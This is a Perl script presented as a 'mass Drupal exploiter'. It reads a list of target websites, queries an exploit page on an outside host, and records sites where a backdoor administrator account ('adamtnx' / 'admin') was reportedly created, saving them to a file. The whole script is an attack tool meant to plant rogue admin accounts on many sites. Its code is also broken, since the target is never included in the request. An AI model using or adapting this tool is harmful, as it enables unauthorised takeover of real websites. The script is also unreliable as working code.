#!/usr/bin/perl -U
# drupal exploiter by adam tnx
# don't change my copyright madafakaa -_-
# admtnx©2017
#salam for all

use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
my $tnx ="
            .                                    .               
         `  y`                                  /: ``            
         `` /d:                     --        `sd` .             
          ```:sd+.              -oooy:      /yd+.``              
         `` `` .ymh-           /syyydo   `ommo`````.             
         `-:``  `oym/         `yyyyNm   `ddy/   `.:`             
         ./:-.`` `.+-         +ys+hMm    y/`  ``.-::             
          .ss+-``` `         . -smdMs    -` .`./oy/              
           :+oo/:. ``       /- `o/yMo    ```.:/oo/.              
            -+os+:..-    `/hs: -/ydM:   .-`-/ooo/`               
               -:-.`-.`  ohh-y +- +M`  --.`---`                  
               :/o+:-.+/ `yd:/`/.-so :s/.-/o+/.                  
                 -.o`  -+:-h/hsd/--:+/`  //..                    
                         ./yo+-/+yo-                             
                            .`y- `                               
  Coded by Adam Tnx          `N:`                                
      fb/adam.ag.750          s.`                                
                               `                                 
    
 \n\n
";

    print color('bold blue');

print $tnx;
print color("red"), "W3lcome..New Mass Drupal exploiter  \n";
print color("green"), "If you need some website use the dorker \n";
print color("green"), " you will find it with this bot  \n";
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /www./) { $target = "www.$target"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });

my $exploit = "http://www.xgames.co.il/drupal_mass_exploiter.php";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success! Log in with username \"adamtnx\" and password \"admin\" at/) {
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] ";
print color ('green');
print "$target";
print color ('reset');
print " tneek :)  !! \n";


    open(save, '>>tnxVuln.txt');
  
    print save " Don3 ! $target | username : adamtnx | pass: admin\n";
  
    close(save);
}
else { 

#####################
###error madafak#####
#####################
print color ('blue');
print "$target";
print color ('reset');
print " OOPS !! not vuln! \n";
}

}